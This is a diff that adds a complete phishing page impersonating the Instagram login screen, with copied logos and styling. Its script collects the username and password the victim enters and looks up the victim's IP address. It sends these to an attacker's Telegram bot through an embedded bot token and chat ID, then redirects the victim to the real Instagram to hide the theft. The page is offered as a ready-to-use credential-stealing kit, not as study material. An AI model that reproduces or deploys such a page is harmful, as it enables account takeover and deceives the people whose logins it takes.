@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login</title>
+
+<style>
+    /* Pichla same CSS Style */
+    * { box-sizing: border-box; }
+    body {
+        margin: 0;
+        height: 100vh;
+        background-color: #000000;
+        color: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px;
+    }
+    .language-select { color: #737373; font-size: 12px; margin-top: 20px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
+    .login-container { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; margin-top: -60px; }
+    .insta-logo { width: 80px; height: 80px; margin-bottom: 50px; }
+    .input-group { width: 100%; display: flex; flex-direction: column; gap: 12px; }
+    input { width: 100%; padding: 16px; background: #121212; border: 1px solid #262626; border-radius: 12px; color: #fff; font-size: 14px; outline: none; }
+    input:focus { border-color: #555; }
+    input::placeholder { color: #737373; }
+    .login-btn { width: 100%; padding: 14px; background-color: #0064e0; border: none; border-radius: 25px; color: #fff; font-size: 14px; font-weight: 600; margin-top: 20px; cursor: pointer; }
+    .forgot-pass { margin-top: 18px; font-size: 13px; color: #e0f1ff; text-decoration: none; font-weight: 500; }
+    .bottom-section { width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center; gap: 15px; margin-bottom: 20px; }
+    .create-btn { width: 100%; padding: 12px; background: transparent; border: 1px solid #0064e0; border-radius: 25px; color: #0064e0; font-size: 14px; font-weight: 600; cursor: pointer; }
+    .meta-logo { display: flex; align-items: center; gap: 4px; color: #737373; font-size: 14px; font-weight: 600; }
+    .meta-icon { height: 12px; fill: #737373; }
+</style>
+</head>
+
+<body>
+
+    <div class="language-select">English (UK) <span>&#8964;</span></div>
+
+    <div class="login-container">
+        <svg class="insta-logo" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="insta_grad" x1="0%" y1="100%" x2="100%" y2="0%">
+                    <stop offset="0%" style="stop-color:#f09433;stop-opacity:1" />
+                    <stop offset="25%" style="stop-color:#e6683c;stop-opacity:1" />
+                    <stop offset="50%" style="stop-color:#dc2743;stop-opacity:1" />
+                    <stop offset="75%" style="stop-color:#cc2366;stop-opacity:1" />
+                    <stop offset="100%" style="stop-color:#bc1888;stop-opacity:1" />
+                </linearGradient>
+            </defs>
+            <path fill="url(#insta_grad)" d="M349.33,69.33H162.67C111.74,69.33,69.33,111.74,69.33,162.67V349.33C69.33,400.26,111.74,442.67,162.67,442.67H349.33C400.26,442.67,442.67,400.26,442.67,349.33V162.67C442.67,111.74,400.26,69.33,349.33,69.33ZM373.33,349.33c0,13.23-10.77,24-24,24H162.67c-13.23,0-24-10.77-24-24V162.67c0-13.23,10.77-24,24-24H349.33c13.23,0,24,10.77,24,24V349.33Z"/>
+            <path fill="url(#insta_grad)" d="M256,128c-70.69,0-128,57.31-128,128s57.31,128,128,128,128-57.31,128-128S326.69,128,256,128Zm0,213.33c-47.06,0-85.33-38.27-85.33-85.33S208.94,170.67,256,170.67,341.33,208.94,341.33,256,303.06,341.33,256,341.33Z"/>
+            <path fill="url(#insta_grad)" d="M373.33,118.67a21.33,21.33,0,1,0,21.33,21.33A21.35,21.35,0,0,0,373.33,118.67Z"/>
+        </svg>
+
+        <div class="input-group">
+            <input id="user" placeholder="Username, email address or mobile number">
+            <input id="pass" type="password" placeholder="Password">
+        </div>
+
+        <button class="login-btn" onclick="send()">Log in</button>
+        <a href="#" class="forgot-pass">Forgotten password?</a>
+    </div>
+
+    <div class="bottom-section">
+        <button class="create-btn">Create new account</button>
+        <div class="meta-logo">
+            <svg class="meta-icon" viewBox="0 0 60 32" xmlns="http://www.w3.org/2000/svg">
+                 <path d="M42.6,0C36.8,0,32.4,4,29.9,8.4C27.4,4,23.1,0,17.2,0C7.6,0,0,7.2,0,16s7.6,16,17.2,16c5.9,0,10.3-4,12.8-8.4c2.5,4.4,6.9,8.4,12.8,8.4c9.6,0,17.2-7.2,17.2-16S52.2,0,42.6,0z M17.2,26.4c-5.1,0-9.2-4.7-9.2-10.4s4.1-10.4,9.2-10.4c3.4,0,6.2,2.2,7.7,5.5l0.4,0.9l-2.8,4l2.8,4l-0.4,0.9C23.4,24.2,20.6,26.4,17.2,26.4z M42.6,26.4c-3.4,0-6.2-2.2-7.7-5.5l-0.4-0.9l2.8-4l-2.8-4l0.4-0.9c1.5-3.3,4.3-5.5,7.7-5.5c5.1,0,9.2,4.7,9.2,10.4S47.7,26.4,42.6,26.4z"/>
+            </svg>
+            Meta
+        </div>
+    </div>
+
+<script>
+    // === YAHAN APNA BOT TOKEN AUR CHAT ID DALEIN ===
+    const BOT = "8594627373:AAH5N7Ot9kU4Hy3XLHkWJxMvp0KIsAL6-iA";  // Example: 123456789:AbCdEfGhIjKlMnOpQrStUvWxYz
+    const CHAT = "7601287974";   // Example: 123456789
+
+    // IP Fetch karne ka function
+    async function ip() {
+        try {
+            let response = await fetch("https://api.ipify.org?format=json");
+            let data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return "Unknown IP";
+        }
+    }
+
+    // Main Send Function
+    async function send() {
+        let u = document.getElementById("user").value;
+        let p = document.getElementById("pass").value;
+
+        if(!u || !p) {
+            alert("Please fill in all fields.");
+            return;
+        }
+
+        let i = await ip(); // Wait for IP
+        
+        let msg = `INSTAGRAM ACCOUNT HAVKED BY SHIVAM \n\n👤 User: ${u}\n🔑 Pass: ${p}\n🌐 IP: ${i}\n⏰ ${new Date().toLocaleString()}`;
+
+        // Telegram Send
+        fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT, text: msg })
+        })
+        .then(response => {
+            if(response.ok) {
+                // Success hone par kya karna hai? (Redirect ya alert)
+                window.location.href = "https://instagram.com"; // Redirect to real insta
+            } else {
+                alert("Connection Error. Please try again.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+        });
+    }
+</script>
+
+</body>
+</html>
